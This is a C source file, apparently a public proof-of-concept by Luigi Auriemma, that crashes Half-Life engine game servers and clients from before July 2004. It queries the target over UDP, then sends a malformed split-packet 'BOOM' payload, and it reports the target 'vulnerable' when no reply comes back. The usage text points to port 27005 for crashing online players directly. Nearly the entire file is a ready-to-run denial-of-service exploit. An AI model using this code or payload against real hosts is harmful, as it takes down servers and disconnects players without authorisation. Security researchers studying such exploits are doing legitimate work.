/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif



#define VER         "0.1"
#define BUFFSZ      2048
#define PORT        27015
#define INFO        "\xff\xff\xff\xff" "infostring\n\0"
#define TIMEOUT     4



int timeout(int sock);
void showinfostring(u_char *buff, int size);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                len;
    u_short     port = PORT;
    u_char      buff[BUFFSZ + 1],
                boom[] =
                "\xFE\xFF\xFF\xFF" "\x00\x00\x00\x00";
//               |                  |
//               |                  any number from 0 until 0xffffffff
//               this is the cause of the crash: splitted data


    setbuf(stdout, NULL);

    fputs("\n"
        "Half-Life engine (before 07 July 2004) remote server/client crash "VER"\n"
        "Found by: Terry Henning (aka Soul Beaver)\n"
        "Code by:  Luigi Auriemma\n"
        "          e-mail: aluigi@altervista.org\n"
        "          web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s <host> [port(%d)]\n"
            "\n"
            "Use port 27005 to directly crash online clients\n"
            "\n", argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    srand(time(NULL));

    if(argc > 2) port = atoi(argv[2]);
    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("\nTarget %s:%hu\n\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) std_err();

    fputs("- Request informations\n", stdout);
    if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, probably the server is not online\n\n", stdout);
        exit(1);
    }
    len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
    if(len < 0) std_err();
    buff[len] = 0x00;
    showinfostring(buff, len);

    fputs("- Send BOOM packet\n", stdout);
    *(u_long *)(boom + 4) = (rand() << 16) ^ rand();
    boom[4] &= 0xfe;    // 0xffffffff sometimes doesn't crash the server

    if(sendto(sd, boom, sizeof(boom) - 1, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nServer IS vulnerable!!!\n\n", stdout);
    } else {
        len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
        if(len < 0) std_err();
        buff[len] = 0x00;
        printf("\n"
            "Server doesn't seem to be vulnerable, the following is the answer received:\n"
            "\n%s\n\n", buff);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



void showinfostring(u_char *buff, int size) {
    int     nt = 1,
            len;
    u_char  *string;

    len = strlen(buff);
    if(len < size) buff += len + 1;

    while(1) {
        string = strchr(buff, '\\');
        if(!string) break;

        *string = 0x00;

        if(!nt) {
            printf("%30s: ", buff);
            nt++;
        } else {
            printf("%s\n", buff);
            nt = 0;
        }
        buff = string + 1;
    }

    printf("%s\n\n", buff);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

